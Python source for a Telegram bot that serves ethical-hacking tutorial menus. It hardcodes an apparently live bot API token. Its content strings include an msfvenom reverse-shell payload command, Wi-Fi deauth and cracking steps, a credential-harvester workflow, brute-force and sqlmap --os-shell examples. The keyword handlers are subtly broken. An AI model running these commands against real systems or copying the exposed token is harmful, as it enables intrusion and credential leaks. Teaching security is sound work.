from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
import difflib

TOKEN = '8190208521:AAH0tcqXs7xu8CltqFdFAZDOvc-YSnsDbEc'

# Topics configuration
topics = {
    "main": [
        ("🛡️ Basic Hacking", "basic"),
        ("⚙️ Advanced Hacking", "advanced"),
        ("🛠️ Tools & Installation", "tools"),
        ("📈 Career & Certifications", "career"),
    ],

    "basic": [
        ("What is Ethical Hacking?", "WIH"),
        ("Types of Hackers", "TOH"),
        ("Steps for hacking", "SFH"),
        ("Reconnaissance", "REC"),
        ("Networking", "networking"),
        ("Linux Commands", "LC"),
        ("Installing Kali Linux", "IKL"),
        ("Interesting Linux Commands", "ILC")
    ],

    "advanced": [
        ("🖥️ System Hacking", "system"),
        ("🧠 Social Engineering", "social"),
        ("📡 Recon & Info Gathering", "recon"),
        ("🧪 Penetration Testing", "pentesting"),
        ("📶 Wi-Fi & Network Hacking", "wifi"),
        ("📱 Mobile Hacking", "mobile"),
        ("💻 Linux & Terminal Setup", "linux"),
        ("🔐 Cryptography", "crypto"),
        ("🕵️ Vulnerability Assessment", "vuln"),
        ("🧰 Payloads & Exploits", "payloads"),
        ("🌐 Website Testing", "web"),
        ("☁️ Cloud Hacking", "cloud"),
        ("🦠 Malware Analysis", "malware")
    ],

    "tools": [
        ("🔍 Nmap", "nmap"),
        ("🌐 Wireshark", "wireshark"),
        ("🔑 Hydra", "hydra"),
        ("🧪 Burp Suite", "burpsuite"),
        ("📦 Metasploit", "metasploit"),
        ("🛡️ Nikto", "nikto"),
        ("🕷️ SQLMap", "sqlmap"),
        ("🔧 John the Ripper", "john"),
        ("📱 MobSF", "mobsf"),
        ("📡 Aircrack‑ng", "aircrackng"),
        ("🧰 Ghidra", "ghidra")
    ],
    "career": [
        ("Why Choose Ethical Hacking?", "why_career"),
        ("Top Ethical Hacking Certifications", "certs"),
        ("Roadmap to Become an Ethical Hacker", "roadmap"),
        ("Job Roles & Salaries", "jobs"),
        ("Career Tips & Resources", "career_tips")
    ],

}

content = {
    "basic": "*🛡️ Basic Hacking Topics:*\n\nBegin your journey into the world of ethical hacking. Choose a foundational topic to build your skills and unlock the path to becoming a cybersecurity expert.",

    "WIH": "*🛡️ What is Ethical Hacking?*\n\n"
           "Ethical hacking is the authorized practice of bypassing system security to identify potential threats and vulnerabilities in a network or system. "
           "Organizations hire ethical hackers to simulate cyberattacks and discover weak points that could be exploited by malicious actors.\n\n"
           "*Goals:*\n"
           "- Strengthen system defenses\n"
           "- Prevent unauthorized access\n"
           "- Ensure compliance with security standards\n"
           "- Minimize risks before real attackers exploit them\n\n"
           "✅ Ethical hacking is legal, authorized, and follows a code of conduct unlike malicious hacking.",

    "TOH": "*🎭 Types of Hackers:*\n\n"
           "1. *White Hat Hackers*: Cybersecurity professionals who legally hack systems to strengthen security.\n"
           "2. *Black Hat Hackers*: Criminal hackers who exploit systems for financial gain, disruption, or theft.\n"
           "3. *Gray Hat Hackers*: Operate in the gray area — they may hack without permission but don’t have malicious intent.\n"
           "4. *Script Kiddies*: Inexperienced individuals who use pre-built tools or scripts without understanding how they work.\n"
           "5. *Hacktivists*: Hackers motivated by political or social causes, aiming to promote agendas or protest.\n"
           "6. *State-Sponsored Hackers*: Work for governments to attack or defend against foreign threats.\n"
           "7. *Red Team vs. Blue Team Hackers*: Red teams simulate attacks; blue teams defend against them.",

    "SFH": "*🧱 Steps for Hacking (Cyber Kill Chain):*\n\n"
           "1. *Reconnaissance*: Gathering information about the target (passive and active scanning).\n"
           "2. *Scanning*: Identifying live systems, ports, and services using tools like Nmap or Nessus.\n"
           "3. *Gaining Access*: Exploiting known vulnerabilities (e.g., using Metasploit).\n"
           "4. *Maintaining Access*: Installing malware or creating backdoors for persistent access.\n"
           "5. *Clearing Tracks*: Deleting logs and hiding malicious files to avoid detection.\n"
           "6. *Post-Exploitation*: Data exfiltration, lateral movement, or privilege escalation.\n"
           "7. *Reporting*: (In ethical hacking) Documenting findings and suggesting fixes.",

    "REC": "*🔍 Reconnaissance (Footprinting):*\n\n"
           "The first phase of ethical hacking where the goal is to gather as much data as possible about the target without alerting them.\n\n"
           "*Types:*\n"
           "- Passive: Public sources like WHOIS, search engines, social media.\n"
           "- Active: Direct interaction like port scanning, DNS queries.\n\n"
           "*Common Tools:*\n"
           "- `whois`, `nslookup`: DNS and domain details\n"
           "- `theHarvester`: Email & subdomain harvesting\n"
           "- `Maltego`: Visual data mining\n"
           "- `Recon-ng`, `Shodan`, `Google Dorking`\n\n"
           "🎯 Goal: Map the target’s attack surface.",

    "networking": "*🌐 Networking Essentials for Hackers:*\n\n"
                  "A strong understanding of networking is crucial in ethical hacking. It helps you understand how systems communicate and where vulnerabilities may exist.\n\n"
                  "*Topics to Master:*\n"
                  "- OSI & TCP/IP Models\n"
                  "- IP Addressing & Subnetting\n"
                  "- TCP vs UDP Protocols\n"
                  "- ARP, ICMP, DNS, DHCP\n"
                  "- Common Ports: 21 (FTP), 22 (SSH), 80 (HTTP), 443 (HTTPS), etc.\n\n"
                  "*Useful Networking Commands:*\n"
                  "`ping`, `traceroute`, `ipconfig/ifconfig`, `netstat`, `nslookup`, `nmap`\n\n"
                  "*Packet Analysis Tool:* `Wireshark`\n"
                  "*Port Scanner:* `Nmap`",

    "LC": "*🐧 Essential Linux Commands for Hackers:*\n\n"
          "Linux is the preferred OS for hackers due to its flexibility, scripting power, and open-source nature.\n\n"

          "*🔹 File & Directory Commands:*\n"
          "`ls` – List directory contents  →  `ls -la`\n"
          "`cd` – Change directory  →  `cd /etc`\n"
          "`dir` – List contents of directory  →  `dir /home`\n"
          "`pwd` – Print current working directory  →  `pwd`\n"
          "`mkdir` – Make new directory  →  `mkdir new_folder`\n"
          "`rmdir` – Remove empty directory  →  `rmdir old_folder`\n"
          "`rm` – Remove file/directory  →  `rm -rf file.txt`\n"
          "`mv` – Move or rename files  →  `mv old.txt new.txt`\n"
          "`cp` – Copy files/directories  →  `cp file.txt /tmp/`\n\n"

          "*🔐 Permissions & Ownership:*\n"
          "`chmod` – Change file permissions  →  `chmod 755 script.sh`\n"
          "`chown` – Change file owner/group  →  `chown ankit:admin file.txt`\n"
          "`chgrp` – Change group ownership  →  `chgrp devs file.txt`\n"
          "`umask` – Set default permission mask  →  `umask 0022`\n"
          "`chmod +x script.sh` – Make script executable\n\n"

          "*🌐 Networking Tools:*\n"
          "`ifconfig` – View/modify network interfaces  →  `ifconfig eth0 down`\n"
          "`ip` – Manage IP, routes, interfaces  →  `ip addr show`\n"
          "`netstat` – Show active connections and ports  →  `netstat -tuln`\n"
          "`ping` – Check connectivity  →  `ping -c 4 google.com`\n"
          "`curl` – Transfer data from or to a server  →  `curl -I https://example.com`\n"
          "`wget` – Download files from the internet  →  `wget -c https://site.com/file.iso`\n"
          "`dig` – DNS lookup and domain info  →  `dig +short openai.com`\n\n"

          "*⚙️ System & Process Management:*\n"
          "`ps` – Show running processes  →  `ps aux`\n"
          "`top` – Real-time system monitor  →  `top`\n"
          "`kill` – Terminate a process  →  `kill 1234`\n"
          "`htop` – Enhanced process viewer (needs install)  →  `htop`\n"
          "`df` – Show disk usage  →  `df -h`\n"
          "`du` – Show directory size  →  `du -sh /home/user`\n"
          "`uptime` – Show system uptime and load  →  `uptime`\n\n"

          "*📝 Viewing & Editing Files:*\n"
          "`cat` – Display file content  →  `cat file.txt`\n"
          "`less` – Scroll through file content  →  `less bigfile.log`\n"
          "`nano` – Simple terminal editor  →  `nano notes.txt`\n"
          "`vi` – Powerful text editor  →  `vi config.sh`\n"
          "`grep` – Search for patterns in files  →  `grep 'error' log.txt`\n"
          "`find` – Locate files by name or type  →  `find / -name \"*.conf\"`\n\n"

          "*💡 Scripting & Automation:*\n"
          "`bash` – Shell scripting language  →  Automate tasks using `.sh` scripts\n"
          "`cron` – Schedule repetitive tasks  →  `crontab -e`\n"
          "`expect` – Automate interactive shell sessions  →  Automate SSH, FTP, etc.\n\n",

    "ILC": "*🐧 Interesting Linux Commands for Hackers:*\n\n"
           "*😎 Fun & Hacker-Style Terminal Commands:*\n"
           "`cowsay 'Hack the planet!'` – Talking ASCII cow 🐄\n"
           "`sl` – Steam locomotive when you mistype `ls`\n"
           "`cmatrix` – Matrix rain effect 💻\n"
           "`lolcat` – Rainbow-colored output 🌈\n"
           "`figlet HACKER` – Big ASCII banners\n"
           "`toilet H4cker` – Styled ASCII text art\n"
           "`oneko` – Cat chases your cursor 🐱\n"
           "`aafire` – Burning fire in terminal 🔥\n"
           "`asciiquarium` – ASCII aquarium 🐠\n"
           "`fortune | cowsay | lolcat` – Fortune cow combo 🐄🌈\n"
           "`telnet towel.blinkenlights.nl` – Watch Star Wars in ASCII ⭐\n"
           "`rev`, `yes`, `cal`, `uptime`, `date`, `watch` – Quirky tools\n"
           "`hollywood` – Simulated hacker terminal effect 🎬\n"
           "`hacker` – Show off with animated hacking look\n\n"
           "you can install this all command by \n\n"
           "`sudo apt install cowsay lolcat sl cmatrix figlet toilet fortune aafire oneko asciiquarium hollywood` \n\n"
           "*🔥 Tip:* You can combine fun tools with `lolcat` for extra flair. Try `figlet Hello | lolcat`!",

    "IKL": "*💻 Installing Kali Linux (Step-by-Step):*\n\n"
           "Kali Linux is a Debian-based distribution packed with pre-installed security tools.\n\n"
           "*1. Download ISO:*\n"
           "- Official site: [https://www.kali.org](https://www.kali.org)\n\n"
           "*2. Create Bootable USB:*\n"
           "- Use `Rufus` (Windows) or `Balena Etcher` (Linux/macOS)\n\n"
           "*3. Install Kali:*\n"
           "- Boot your system from the USB\n"
           "- Follow on-screen installation steps (language, time, disk partitioning, etc.)\n\n"
           "*4. Post-Installation:*\n"
           "- Update system:\n"
           "  `sudo apt update && sudo apt upgrade`\n"
           "- Install guest additions (if using VirtualBox):\n"
           "  `sudo apt install virtualbox-guest-utils`\n\n"
           "*5. Run in Virtual Machine (Optional):*\n"
           "- Use VirtualBox or VMware for dual-boot-free experience.\n\n"
           "🎯 *Recommended*: Use a VM if you're a beginner to avoid damaging your primary system.",

    "advanced": "*🔍 Advanced Hacking Topics:*\n\nDive deep into real-world offensive techniques. Select a topic:",

    "system": "*🔐 System Hacking:* (Windows/Linux)\n\n📌 Key Phases:\n"
              "- *Gaining Access*: Weak creds, unpatched services, malware\n"
              "- *Privilege Escalation*: Sudo misconfigurations, kernel exploits, token impersonation\n"
              "- *Maintaining Access*: Backdoors, scheduled tasks, services\n"
              "- *Clearing Tracks*: Modify event logs, timestamps (e.g., Timestomp)\n\n"
              "🛠 Tools: `mimikatz`, `winPEAS`, `linPEAS`, `chntpw`, `meterpreter`\n"
              "💡 *Example*: `net user administrator /active:yes` enables built-in admin on Windows.",

    "social": "*🎭 Social Engineering:*\n\nTarget human trust and behavior.\n📌 Techniques:\n"
              "- *Phishing*: Fake emails/websites to steal credentials\n"
              "- *Baiting*: Malware-infected USB drops\n"
              "- *Impersonation*: Posing as trusted person\n\n"
              "🛠 Tool: `setoolkit`\n"
              "💡 *Workflow*: `sudo setoolkit` → Social‑Engineering Attacks → Credential Harvester → Mock site → Collect creds.",

    "recon": "*🔎 Recon & Info Gathering:*\n\nPhase aims to build a complete map of the target environment.\n📌 Use Cases:\n"
             "- Domain registration: `whois example.com`\n"
             "- DNS entry collection: `nslookup`, `dig`, `dnsenum`\n"
             "- IoT & device fingerprinting: `shodan host 1.2.3.4`\n"
             "- Directory enumeration: `dirb http://target.com`\n\n"
             "Outcome: A complete blueprint for attack planning.",

    "pentesting": "*🧪 Penetration Testing Structure:*\n\nA methodical approach to simulate cyber-attacks.\n📌 Types:\n"
                  "- *Blackbox*: No prior intel\n"
                  "- *Graybox*: Partial access/info\n"
                  "- *Whitebox*: Full system data\n\n"
                  "📘 Phases:\n"
                  "1. Planning & Scoping\n2. Recon & Scanning\n3. Exploitation\n4. Post‑Exploitation\n5. Reporting & Remediation\n\n"
                  "⚙️ Tools: Metasploit, Burp Suite, Nmap, SQLmap, Nikto",

    "wifi": "*📶 Wi‑Fi & Wireless Attacks:*\n\nHack local wireless networks.\n📌 Steps:\n"
            "1. Enable monitor mode: `airmon-ng start wlan0`\n"
            "2. Capture handshakes: `airodump-ng wlan0mon`\n"
            "3. Deauth to force clients to reconnect: `aireplay-ng -0 5 -a <BSSID> wlan0mon`\n"
            "4. Crack WPA/WPA2: `aircrack-ng -w wordlist.txt capture.cap`\n\n"
            "⚙️ Tools: aircrack-ng suite, hashcat, reaver, wash",

    "mobile": "*📱 Mobile Hacking:*\n\nExplore app exploitation & analysis.\n📌 Topics:\n"
              "- *Static Analysis*: Reverse-engineer APK using `APKTool`\n"
              "- *Dynamic*: Use `Frida`, `Xposed`\n"
              "- *RATs & Spyware*: `AndroRAT`, custom payloads\n\n"
              "⚙️ Framework: `MobSF` – upload APK, receive vulnerability report.\n"
              "`./setup.sh` → open http://localhost:8000 → scan APK/IPA",

    "linux": "*🐧 Linux & Terminal Foundations:*\n\nLearn advanced shell usage and scripting.\n📌 Essentials:\n"
             "- Terminal commands and directory structure\n"
             "- Permissions & SUID bits\n"
             "- Automating tasks via bash scripts and cron jobs\n\n"
             "💡 Example script:\n```bash\n#!/bin/bash\n# scan host\nnmap -sS $1\n```",

    "crypto": "*🔐 Cryptography Practical Guide:*\n\nSafeguard communication/data.\n📌 Topics:\n"
              "- *Hashing* (MD5/SHA256) for integrity checks\n"
              "- *Symmetric Encryption* (AES)\n"
              "- *Asymmetric Encryption* (RSA, ECC)\n\n"
              "🛠 Tools: `openssl`, `gpg`, `hashcat`\n"
              "`echo -n password | sha256sum`\n"
              "`openssl enc -aes-256-cbc -salt -in file.txt -out file.enc`",

    "vuln": "*🛡️ Vulnerability Assessment:*\n\nScan and identify possible weak points.\n📌 Techniques:\n"
            "- *Automated scans*: Nmap scripts, Nessus, OpenVAS\n"
            "- *Manual reviews*: Code, logic, auth flows\n\n"
            "🛠 Commands:\n"
            "`nmap --script vuln -p80,443 target.com`\n"
            "`nikto -h http://target.com`",

    "payloads": "*💥 Payloads & Exploits:*\n\nGenerate attack vectors using msfvenom.\n📌 Workflow:\n"
                "1. Select payload type (reverse shell)\n"
                "2. Generate binary/script\n"
                "3. Serve it and catch a session via Metasploit\n\n"
                "Example:\n"
                "`msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > shell.exe`",

    "web": "*🌐 Website Security Testing:*\n\nIdentify and test web vulnerabilities.\n📌 Focus Areas:\n"
           "- SQL Injection (SQLi)\n"
           "- Cross‑Site Scripting (XSS)\n"
           "- Cross‑Site Request Forgery (CSRF)\n"
           "- Insecure file uploads, LFI/RFI\n\n"
           "🛠 Tools:\n"
           "`sqlmap -u \"http://target.com/?id=1\" --dbs`\n"
           "Burp Suite with Scanner/Repeater modules\n"
           "`nikto` for server misconfigurations",

    "cloud": "*☁️ Cloud Hacking:*\n\nCloud environments (like AWS, Azure, GCP) can be misconfigured, making them vulnerable.\n\n🔐 *Key Techniques:*\n- Misconfiguration Exploits (e.g., public S3 buckets)\n- IAM Abuse (privilege escalation)\n- Metadata API Exploitation\n\n🛠 *Tools:*\n- `ScoutSuite`: Multi-cloud security auditing tool.\n- `Pacu`: AWS exploitation framework.\n\n💡 *Example Attack:*\n- Enumerating IAM roles:\n`aws iam list-roles`\n- Exploiting metadata service:\n`curl http://169.254.169.254/latest/meta-data/`",

    "malware": "*🦠 Malware Analysis:*\n\nMalware analysis helps understand how malicious software works and how to detect/remove it.\n\n🧪 *Techniques:*\n- Static Analysis (without execution)\n- Dynamic Analysis (during execution)\n- Reverse Engineering\n\n🛠 *Tools:*\n- `Ghidra`, `IDA Pro`, `PEStudio`, `VirusTotal`\n\n💡 *Tips:*\n- Use virtual machines (VMs) for safety.\n- Monitor file/registry/network behavior during execution.\n\n🔍 *Example Static Check:*\n`strings malware.exe | less`",

    "tools": "*🧰 Tools & Software Submenu:*\n\nSelect a tool to explore installation, real-world usage, examples, and pro tips.",

    "nmap": "*🔍 Nmap* – Port Scanner & Discovery Tool\n\n🛠 Install:\n`sudo apt install nmap`\n\n🔎 Usage Examples:\n"
            "`nmap -sS 192.168.1.0/24` (TCP SYN scan)\n"
            "`nmap -sV -p 1-1000 target.com` (service/version detection)\n"
            "`nmap -O target.com` (OS detection)\n\n💡 Tip: Use NSE scripts (`--script vuln`) for vulnerability scanning.",

    "wireshark": "*🌐 Wireshark* – Network Packets Analyzer\n\n🛠 Install:\n`sudo apt install wireshark`\n\n🧪 Usage Steps:\n"
                 "- Start GUI, choose interface\n"
                 "- Apply filters like `http`, `tcp.port==22`\n"
                 "- Analyze packet contents (handshakes, payloads)\n\n💡 Tip: Use `tshark` (CLI) for automated captures and analysis.",

    "hydra": "*🔑 Hydra* – Fast Protocol Brute-Forcer\n\n🛠 Install:\n`sudo apt install hydra`\n\n💡 Example Usage:\n"
             "`hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target.com`\n"
             "`hydra -L users.txt -P pass.txt ssh://192.168.1.10`\n\n⚠️ Caution: Respect lockout policies and rate limits.",

    "burpsuite": "*🧪 Burp Suite* – Web Security Testing\n\n🛠 Install Community Edition:\n`sudo apt install burpsuite`\n\n⚙️ Setup:\n"
                 "1. Configure browser proxy to `127.0.0.1:8080`\n"
                 "2. Open site, capture request in Proxy → Intercept\n"
                 "3. Send to Repeater/Intruder for fuzzing\n\n💡 Tip: Use Scanner (Pro) or extension like **ActiveScan++**.",

    "metasploit": "*📦 Metasploit Framework* – Exploitation Platform\n\n🛠 Install:\n`sudo apt install metasploit-framework`\n\n🛠 Usage:\n"
                  "`msfconsole`\n"
                  "`search exploit/windows/smb`\n"
                  "`use exploit/...`\n"
                  "`set RHOSTS, LHOST`\n"
                  "`run`\n\n💡 Tip: Automate with `resource` scripts or use Metasploit Pro/Web UI.",

    "nikto": "*🛡️ Nikto* – Web Server Vulnerability Scanner\n\n🛠 Install:\n`sudo apt install nikto`\n\n💡 Usage:\n"
             "`nikto -h http://target.com`\n"
             "`nikto -Display V -Tuning 2`\n\nUse in recon phase to uncover vulnerable CGIs, outdated headers.",

    "sqlmap": "*🕷️ SQLMap* – Automated SQL Injection Tool\n\n🛠 Install:\n`sudo apt install sqlmap`\n\n💡 Usage:\n"
              "`sqlmap -u \"http://target.com/page.php?id=1\" --dbs`\n"
              "`--tables`, `--dump` to extract data\n"
              "`--os-shell` for remote shell if possible.",

    "john": "*🔧 John the Ripper* – Password Cracker\n\n🛠 Install:\n`sudo apt install john`\n\n💡 Usage:\n"
            "`john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt`\n"
            "`john --show hashfile.txt` to see cracked passwords\n\nSupports MD5, SHA-1, NTLM, etc.",

    "mobsf": "*📱 MobSF* – Mobile App Analysis\n\n🛠 Install:\n```bash\ngit clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git\ncd Mobile-Security-Framework-MobSF\n./setup.sh\n```\n\n🌐 Usage:\n"
             "Open http://localhost:8000 → upload APK/IPA\n"
             "Check UI for security reports: sensitive data, insecure API usage\n\n💡 Tip: Run Android emulator for dynamic 분석.",

    "ghidra": "*🧰 Ghidra* – Reverse Engineering Tool\n\n🛠 Install:\n"
              "- Download the ZIP from [ghidra-sre.org](https://ghidra-sre.org)\n"
              "- Unzip and run `./ghidraRun`\n\n🧩 Usage:\n"
              "Import executable → browse functions → decompile to Java-like code\n\n💡 Tip: Use Python scripts in Ghidra UI for automated batch analysis.",

    "aircrackng": "*📡 Aircrack‑ng* – Wi‑Fi Password Cracker\n\n🛠 Install:\n`sudo apt install aircrack-ng`\n\n🧪 Workflow:\n"
                  "1. `airmon-ng start wlan0`\n"
                  "2. Capture: `airodump-ng wlan0mon`\n"
                  "3. Deauth: `aireplay-ng -0 5 -a <BSSID> wlan0mon`\n"
                  "4. Crack: `aircrack-ng -w wordlist.txt capture.cap`\n\n💡 Tip: Use `cowpatty` or `hashcat` if GPU cracking.",

    "career": "*📈 Career & Certifications:*\n\nChoose a sub-topic below to explore your future in ethical hacking:",

    "why_career": "*Why Choose Ethical Hacking?*\n\nEthical hacking is a high-demand skill in the cybersecurity industry. With increasing cyber threats, companies actively hire professionals to secure systems, detect vulnerabilities, and prevent data breaches.\n\nBenefits:\n- High salary potential\n- Job satisfaction from solving critical problems\n- Global career opportunities\n- Continuous learning and challenge",

    "certs": "*Top Ethical Hacking Certifications:*\n\n1. CEH (Certified Ethical Hacker)\n2. OSCP (Offensive Security Certified Professional)\n3. CompTIA Security+\n4. CISSP (Certified Information Systems Security Professional)\n5. eJPT (eLearnSecurity Junior Penetration Tester)\n6. GPEN (GIAC Penetration Tester)\n\nThese validate your skills in ethical hacking, penetration testing, and network defense.",

    "roadmap": "*Roadmap to Become an Ethical Hacker:*\n\n1. Learn networking basics (TCP/IP, ports, protocols)\n2. Get comfortable with Linux & terminal\n3. Understand cybersecurity concepts\n4. Learn programming (Python recommended)\n5. Study tools like Nmap, Wireshark, Metasploit\n6. Practice on platforms like Hack The Box, TryHackMe\n7. Get certified (e.g., CEH, OSCP)\n8. Start freelancing or apply for entry-level security roles",

    "jobs": "*Job Roles & Salaries:*\n\n- 🔍 Penetration Tester: ₹6–20 LPA\n- 🔐 Security Analyst: ₹5–15 LPA\n- 🧠 Security Consultant: ₹8–25 LPA\n- 🕵️ Ethical Hacker: ₹5–18 LPA\n- 👨‍💻 Security Researcher: ₹6–22 LPA\n\nSalaries vary by skill level, certifications, and experience. Freelance ethical hackers can also earn through bug bounty programs (e.g., HackerOne, Bugcrowd).",

    "career_tips": "*Career Tips & Resources:*\n\n- Stay updated with sites like Hacker News, Cybrary, and Exploit-DB\n- Practice on labs: TryHackMe, Hack The Box, PortSwigger Labs\n- Build a portfolio (GitHub, LinkedIn)\n- Contribute to open source security tools\n- Network with professionals via conferences & Discord communities\n- Keep learning—cybersecurity evolves fast!"
}
keyword_content = {
    "nikto": content["nikto"],
    "linux command": content["LC"],
    "linux commands": content["LC"],
    "about linux": content["LC"],
    "nmap": content["nmap"],
    "cowsay": "🐮 *cowsay* lets an ASCII cow speak your message:\n`sudo apt install cowsay`\nExample: `cowsay Hello, Hacker!`",
    "cmatrix": "🟢 *Matrix Rain Effect (cmatrix)*:\n`sudo apt install cmatrix`\nRun with: `cmatrix`",
    "sl": "🚂 *Steam Locomotive (sl)*: A funny tool when you mistype `ls`\n`sudo apt install sl`",
    "lolcat": "🌈 *Colorful Output (lolcat)*: Pipe any command into `lolcat` for rainbow output.\n`echo Hello | lolcat`",
    "asciiquarium": "🐠 *ASCII Aquarium*: `asciiquarium` shows fish in terminal.\nInstall with: `sudo apt install libcurses-perl && wget https://raw.githubusercontent.com/cmatsuoka/asciiquarium/master/asciiquarium -O /usr/local/bin/asciiquarium && chmod +x /usr/local/bin/asciiquarium`",
    "telnet star wars": "⭐ *Star Wars in ASCII*:\n`telnet towel.blinkenlights.nl`",
    "figlet": "🔤 *FIGlet*: Convert text into ASCII banner font:\n`sudo apt install figlet`\n`figlet H4cker`",
    "toilet": "🚽 *toilet*: Similar to `figlet` but with effects.\n`sudo apt install toilet`",
    "rev": "🔁 *rev*: Reverses input text.\n`echo hello | rev` → `olleh`",
    "yes": "🔁 *yes*: Prints text repeatedly.\n`yes I am a hacker`",

    "hacker": "💻 *Hacker Mode*: Use `hollywood` for a simulated hacker terminal effect.\n`sudo apt install hollywood`\nRun with: `hollywood`",
    "oneko": "🐱 *Oneko*: A cat chases your cursor.\n`sudo apt install oneko`\nRun with: `oneko`",
    "aafire": "🔥 *ASCII Fire*: Displays fire animation in terminal.\n`sudo apt install aafire`\nRun with: `aafire`",
    "h4cker": "👾 *H4cker Bot*: Type `/start` to interact with the bot and learn hacking topics.",
},


def get_keyboard(topic):
    buttons = [[InlineKeyboardButton(text, callback_data=data)] for text, data in topics.get(topic, [])]
    if topic != "main":
        buttons.append([InlineKeyboardButton("⬅️ Back", callback_data="main")])
    return InlineKeyboardMarkup(buttons)


# --- /start Handler ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Hey! I am *H4cker Bot* 🤖\n\nI'm here to teach you Ethical Hacking and inspire your cybersecurity journey! Choose a topic below:",
        parse_mode="Markdown",
        reply_markup=get_keyboard("main")
    )


# --- Greeting Handler (hi/hello) ---
async def greet_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message.text.lower().strip()
    if msg in ["hi", "hello", "hii", "/start"]:
        await start(update, context)


# --- Callback Query Handler for Buttons ---
async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    topic_key = query.data

    if topic_key in topics:
        await query.message.reply_text(
            text=content.get(topic_key, f"*{topic_key.capitalize()} Topics:*"),
            parse_mode="Markdown",
            reply_markup=get_keyboard(topic_key)
        )
    elif topic_key in content:
        await query.message.reply_text(
            text=content[topic_key],
            parse_mode="Markdown",
            reply_markup=get_keyboard("main")
        )
    else:
        await query.message.reply_text("❌ Invalid option. Please try again.")


# --- Keyword/Text Handler with Fuzzy Matching ---
async def keyword_responder(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message.text.lower().strip()

    # Check exact match
    if msg in keyword_content:
        await update.message.reply_text(keyword_content[msg], parse_mode="Markdown")
        return

    # Try fuzzy match
    matches = difflib.get_close_matches(msg, keyword_content.keys(), n=1, cutoff=0.6)
    if matches:
        await update.message.reply_text(
            f"🔍 Showing result for *{matches[0]}*:\n\n{keyword_content[matches[0]]}",
            parse_mode="Markdown"
        )
        return

    # Not found
    await update.message.reply_text("❌ I couldn't find info on that. Try typing a valid hacking keyword or use /start.")


if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_buttons))

    print("✅ H4cker Bot is running...")
    app.run_polling()
